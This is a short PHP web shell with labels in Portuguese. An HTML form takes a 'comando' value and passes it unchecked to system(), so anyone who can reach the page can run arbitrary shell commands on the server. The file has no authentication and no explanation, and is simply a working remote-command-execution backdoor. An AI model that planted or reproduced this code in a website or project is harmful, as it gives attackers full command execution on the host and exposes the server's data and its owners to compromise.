<form>

    <input name="comando">
    <input type="submit" value="executar comando">
<form>
<br>
<pre>
<?php 

$cmd = $_GET['comando'];

system($cmd);

?>
<pre>